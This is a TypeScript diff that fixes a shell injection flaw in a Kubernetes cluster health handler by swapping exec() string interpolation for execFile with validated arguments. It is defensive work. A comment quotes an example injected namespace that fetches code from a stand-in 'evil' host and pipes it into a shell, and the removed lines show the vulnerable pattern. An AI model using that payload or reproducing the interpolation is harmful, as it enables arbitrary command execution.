@@ -1220,12 +1220,24 @@ async function handleClusterHealth(args: unknown, ctx: ToolExecutionContext): Pr
       const decoded = Buffer.from(env.kubeconfig!, 'base64').toString('utf-8')
       kubeconfigPath = join(tmpdir(), `orion-health-${env.id}.yaml`)
       writeFileSync(kubeconfigPath, decoded, { mode: 0o600 })
-      const kc = `--kubeconfig ${kubeconfigPath}`
-      const nsFlag = namespace ? `-n ${namespace}` : '-A'
+      // BLOCKER fix: `namespace` arg was interpolated into exec() template string → shell injection.
+      // A namespace value like `; curl http://evil | sh #` ran arbitrary commands.
+      // Switch to execFile (no shell) with args as an array.
+      const { execFile: execFileCb } = await import('child_process')
+      const execFileAsync = (cmd: string, args: string[], opts: { timeout: number }) =>
+        new Promise<{ stdout: string }>((res, rej) =>
+          execFileCb(cmd, args, { ...opts, encoding: 'utf8' }, (err, stdout) =>
+            err ? rej(err) : res({ stdout: stdout as string })
+          )
+        )
+      // Validate namespace is a safe K8s label (DNS subdomain + dots)
+      const safeNs = namespace && /^[a-z0-9][a-z0-9.-]{0,251}[a-z0-9]$/.test(namespace) ? namespace : null
+      const baseArgs = ['--kubeconfig', kubeconfigPath!, '-o', 'json']
+      const nsArgs   = safeNs ? ['-n', safeNs] : ['-A']
 
       const [nodesOut, podsOut] = await Promise.all([
-        execAsync(`kubectl get nodes ${kc} -o json`,          { timeout: 15_000 }).catch(() => null),
-        execAsync(`kubectl get pods ${nsFlag} ${kc} -o json`, { timeout: 20_000 }).catch(() => null),
+        execFileAsync('kubectl', ['get', 'nodes', ...baseArgs],         { timeout: 15_000 }).catch(() => null),
+        execFileAsync('kubectl', ['get', 'pods', ...nsArgs, ...baseArgs], { timeout: 20_000 }).catch(() => null),
       ])
 
       if (nodesOut) {
